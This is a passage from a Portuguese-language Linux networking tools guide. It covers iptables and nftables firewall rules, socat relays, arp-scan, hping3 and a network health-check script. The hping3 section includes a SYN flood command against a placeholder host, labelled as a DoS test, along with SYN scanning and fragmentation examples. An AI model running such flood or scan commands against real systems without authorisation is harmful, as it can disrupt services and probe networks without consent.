sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

# Permitir loopback
sudo iptables -A INPUT -i lo -j ACCEPT

# Permitir conexões estabelecidas
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# SSH (porta 22)
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT

# HTTP (porta 80)
sudo iptables -A INPUT -p tcp --dport 80 -m state --state NEW -j ACCEPT

# HTTPS (porta 443)
sudo iptables -A INPUT -p tcp --dport 443 -m state --state NEW -j ACCEPT

# Ping
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT

# Log pacotes dropados
sudo iptables -A INPUT -m limit --limit 5/min -j LOG --log-prefix "iptables-dropped: " --log-level 7

# Salvar regras
sudo iptables-save > /etc/iptables/rules.v4

echo "Firewall configurado!"
sudo iptables -L -n -v
```

---

### 20. nftables - Firewall Moderno

**Instalação**: `sudo apt install nftables`

#### Casos de Uso

```bash
# Ver regras
sudo nft list ruleset

# Criar tabela
sudo nft add table inet filter

# Criar chain
sudo nft add chain inet filter input { type filter hook input priority 0 \; }

# Adicionar regra
sudo nft add rule inet filter input tcp dport 22 accept

# Limpar tudo
sudo nft flush ruleset

# Salvar configuração
sudo nft list ruleset > /etc/nftables.conf

# Carregar configuração
sudo nft -f /etc/nftables.conf
```

---

## Utilitários Diversos

### 21. socat - Multipurpose Relay

**Instalação**: `sudo apt install socat`

#### Casos de Uso

```bash
# Port forwarding
socat TCP-LISTEN:8080,fork TCP:backend:80

# SSL/TLS wrapper
socat TCP-LISTEN:8080 OPENSSL:backend:443

# UDP relay
socat UDP-LISTEN:5000,fork UDP:target:5000

# Conectar dois processos
socat PTY,link=/tmp/tty1 PTY,link=/tmp/tty2

# Serial port
socat TCP-LISTEN:5000 /dev/ttyUSB0,raw,echo=0
```

---

### 22. arp-scan - ARP Scanner

**Instalação**: `sudo apt install arp-scan`

#### Casos de Uso

```bash
# Scan na rede local
sudo arp-scan --localnet

# Interface específica
sudo arp-scan -I eth0 --localnet

# Range específico
sudo arp-scan 192.168.1.0/24

# Identificar vendor
sudo arp-scan -l

# Ignorar duplicatas
sudo arp-scan -l -g
```

---

### 23. hping3 - Gerador de Pacotes

**Instalação**: `sudo apt install hping3`

#### Casos de Uso

```bash
# ICMP ping
sudo hping3 --icmp 192.168.1.1

# TCP SYN scan
sudo hping3 -S -p 80 192.168.1.1

# UDP scan
sudo hping3 --udp -p 53 8.8.8.8

# Flood SYN (DoS test - CUIDADO!)
sudo hping3 -S --flood -p 80 target.com

# Traceroute TCP
sudo hping3 -T -p 80 google.com

# Fragmentação
sudo hping3 -S -p 80 -f 192.168.1.1
```

---

## Scripts de Automação Completos

### Script 1: Health Check de Rede

```bash
#!/bin/bash
# health-check.sh - Verificação completa de saúde da rede

REPORT_FILE="health_check_$(date +%Y%m%d_%H%M%S).txt"

{
    echo "========================================="
    echo "   HEALTH CHECK DE REDE"
    echo "   $(date)"
    echo "========================================="
    
    echo -e "\n[1] INTERFACES DE REDE"
    ip -br -c addr show
    
    echo -e "\n[2] ROTAS"
    ip route show
    
    echo -e "\n[3] DNS"
    cat /etc/resolv.conf
    
    echo -e "\n[4] TESTE DE CONECTIVIDADE"
    GATEWAY=$(ip route | grep default | awk '{print $3}')
    echo "Gateway: $GATEWAY"
    ping -c 3 $GATEWAY
    
    echo -e "\n[5] TESTE DE INTERNET"
    ping -c 3 8.8.8.8
    
    echo -e "\n[6] TESTE DE DNS"
    dig +short google.com
    
    echo -e "\n[7] PORTAS ABERTAS"
    sudo ss -tlnp
    
    echo -e "\n[8] CONEXÕES ATIVAS"
    sudo ss -tan state established | wc -l
    
    echo -e "\n[9] ESTATÍSTICAS DE ERROS"
    for iface in $(ls /sys/class/net/ | grep -v lo); do
        echo "Interface: $iface"
        ip -s link show $iface | grep -E "RX|TX|errors|dropped"
    done
    
    echo -e "\n[10] USO DE BANDA (últimas 24h)"
    vnstat
    
} | tee $REPORT_FILE

echo "Relatório salvo em: $REPORT_FILE"
```

---

## Referências

### Documentação
- [man pages](https://linux.die.net/man/)
- [Debian Network Configuration](https://wiki.debian.org/NetworkConfiguration)
- [Linux Network Administrators Guide](https://www.tldp.org/LDP/nag2/)

### Livros Recomendados
- "Linux Network Administrator's Guide" - Tony Bautts
- "TCP/IP Illustrated" - W. Richard Stevens
- "Wireshark Network Analysis" - Laura Chappell

---

**Autor**: Guia Prático de Ferramentas de Rede  
**Sistema**: Debian GNU/Linux  
**Última Atualização**: 2025  
**Licença**: Open Source

